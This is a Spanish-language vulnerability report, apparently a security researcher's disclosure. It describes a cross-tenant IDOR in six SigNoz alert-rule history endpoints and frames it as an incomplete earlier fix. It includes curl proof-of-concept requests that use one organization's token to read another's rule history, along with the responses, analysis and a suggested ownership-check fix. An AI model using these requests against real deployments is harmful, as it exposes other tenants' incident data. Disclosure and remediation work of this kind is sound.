Alert-rule history IDOR_

MediumCross-tenant IDORNo response
SigNozIDORBroken Access ControlAlert History

Contexto: este reporte documenta una corrección incompleta de un IDOR anterior en alert rules. La validación se realizó en un laboratorio local de dos organizaciones construido desde la Community Edition de SigNoz, sin usuarios, tokens ni proveedor de identidad compartidos.

Durante la revisión de SigNoz encontré que los seis endpoints de historial de estado de alert rules no verificaban que la organización del usuario fuera propietaria de la regla consultada.

Cualquier usuario autenticado con rol Viewer o superior que conociera o adivinara el UUID de una regla de otra organización podía leer su historial completo de triggers y estados, sin relación alguna entre los dos tenants.

Un problema de control de acceso sobre las operaciones CRUD de alert rules había sido reportado y corregido previamente mediante un filtro org_id. El mismo patrón seguía presente en los endpoints hermanos del historial, tanto en la API v1 como en la v2. Por eso este hallazgo debe entenderse como una señal de corrección incompleta, no como una clase nueva de vulnerabilidad.

Endpoints afectados

API v1

POST /api/v1/rules/{id}/history/stats
POST /api/v1/rules/{id}/history/overall_status
POST /api/v1/rules/{id}/history/timeline
POST /api/v1/rules/{id}/history/top_contributors

Los cuatro handlers legacy estaban definidos en pkg/query-service/app/http_handler.go.

API v2

GET /api/v2/rules/{id}/history/stats
GET /api/v2/rules/{id}/history/overall_status

Estos handlers estaban definidos en pkg/modules/rulestatehistory/implrulestatehistory/handler.go.

Falta de ownership check en v2

GetRuleHistoryStats y GetRuleHistoryOverallStatus no extraían claims.OrgID, a diferencia de otros handlers v2 del mismo archivo, como GetRuleHistoryTimeline, GetRuleHistoryContributors y los de filtros.

La capa inferior consultaba únicamente por rule_id. La tabla ClickHouse distributed_rule_state_history_v0 tampoco contiene una columna org_id, por lo que el aislamiento por tenant es imposible en ese nivel si no se valida la propiedad antes de ejecutar la consulta.

La misma brecha en v1

Los cuatro handlers legacy, getRuleStats, getOverallStateTransitions, getRuleStateHistory y getRuleStateHistoryTopContributors, compartían la misma omisión.

Todos llamaban a funciones del reader ClickHouse que filtraban por rule_id, pero nunca por org_id. El UUID de la regla se convertía así en el único límite efectivo, aunque la autorización de la petición se hubiera realizado para un usuario de otra organización.

Modelo del fallo

token del usuario en Org B
        ↓
claims.OrgID = Org B
        ↓
URL contiene RULE_A_ID
        ↓
handler valida formato UUID
        ↓
reader consulta rule_id = RULE_A_ID
        ↓
historial de Org A devuelto a Org B

Validar que el identificador tenga formato UUID no verifica que el recurso pertenezca al tenant del usuario. El control debe ocurrir antes de consultar el historial.

Prueba de concepto local

La reproducción utilizó un laboratorio local de dos organizaciones en la Community Edition:

  • Org A: organización propietaria de la alert rule.
  • Org B: organización del usuario que realiza la consulta.
  • RULE_A_ID: UUID de una regla creada en Org A.
  • TOKEN_B: token de un usuario de Org B sin relación con Org A.

La regla no llegó a dispararse durante la corta vida del laboratorio. Por eso algunos campos devueltos fueron cero o listas vacías; el hallazgo es el HTTP 200 con datos asociados a una regla de otro tenant, donde correspondía un 403 o 404.

1. v1: history/stats

curl -sS -X POST \
  "$BASE_URL/api/v1/rules/$RULE_A_ID/history/stats" \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" \
  -d '{"start":1,"end":9999999999999}'
{
  "status": "success",
  "data": {
    "totalCurrentTriggers": 0,
    "totalPastTriggers": 0,
    "currentAvgResolutionTime": "0",
    "pastAvgResolutionTime": "0"
  }
}

Resultado: HTTP 200 para una regla de Org A utilizando un token de Org B.

2. v1: history/overall_status

curl -sS -X POST \
  "$BASE_URL/api/v1/rules/$RULE_A_ID/history/overall_status" \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" \
  -d '{"start":1,"end":9999999999999}'

HTTP/1.1 200
{"status":"success","data":[{"state":"inactive","start":1,"end":9999999999999}]}

3. v1: history/timeline

curl -sS -X POST \
  "$BASE_URL/api/v1/rules/$RULE_A_ID/history/timeline" \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" \
  -d '{"start":1,"end":9999999999999,"order":"desc"}'

HTTP/1.1 200
{"status":"success","data":{"items":[],"total":0,"labels":{}}}

Una petición inicial sin el campo order fue rechazada con 400 order must be asc or desc. Esto era una validación de forma de la petición anterior al código vulnerable, no una mitigación del control de acceso.

4. v1: history/top_contributors

curl -sS -X POST \
  "$BASE_URL/api/v1/rules/$RULE_A_ID/history/top_contributors" \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" \
  -d '{"start":1,"end":9999999999999}'

HTTP/1.1 200
{"status":"success","data":[]}

5. v2: history/stats

curl -sS \
  "$BASE_URL/api/v2/rules/$RULE_A_ID/history/stats?start=1&end=9999999999999" \
  -H "Authorization: Bearer $TOKEN_B"

HTTP/1.1 200
{"status":"success","data":{"totalCurrentTriggers":0,"totalPastTriggers":0,"currentTriggersSeries":{"values":[]}}}

6. v2: history/overall_status

curl -sS \
  "$BASE_URL/api/v2/rules/$RULE_A_ID/history/overall_status?start=1&end=9999999999999" \
  -H "Authorization: Bearer $TOKEN_B"

HTTP/1.1 200
{"status":"success","data":[{"state":"inactive","start":1,"end":9999999999999}]}

Los seis endpoints devolvieron HTTP 200 con datos asociados a una regla de Org A a un caller de Org B sin relación con ella.

Impacto

Un atacante con cualquier cuenta válida podía acceder al historial de alertas de otra organización si obtenía el UUID de la regla mediante comportamiento de la aplicación, divulgación u otra fuente.

El historial puede revelar qué condiciones se dispararon, cuándo ocurrieron, con qué frecuencia y cuál fue el tiempo medio de resolución. Estos datos permiten inferir información sobre la salud de la infraestructura de la organización víctima y su cadencia de incidentes.

Corrección sugerida

Los seis endpoints deben extraer claims.OrgID y verificar la propiedad de la regla antes de ejecutar cualquier consulta de historial. La validación puede resolverse mediante el rule store con scope de organización, siguiendo el patrón de los handlers v2 que ya realizan la comprobación:

claims.OrgID
    ↓
resolver alert rule con org_id
    ↓
si no pertenece al tenant: 403/404
    ↓
consultar historial por rule_id

Como la tabla ClickHouse distributed_rule_state_history_v0 no contiene org_id, el control debe hacerse en la capa Go antes de ejecutar la consulta, no únicamente en SQL.

También conviene añadir pruebas de regresión con dos organizaciones independientes para cada endpoint v1 y v2, comprobando que un UUID válido de otro tenant no devuelve resultados.

Estado

Este reporte documenta una corrección incompleta de un IDOR anterior en alert rules. La validación quedó confirmada en los seis endpoints de historial, tanto v1 como v2, y los resultados quedan documentados en este artículo.
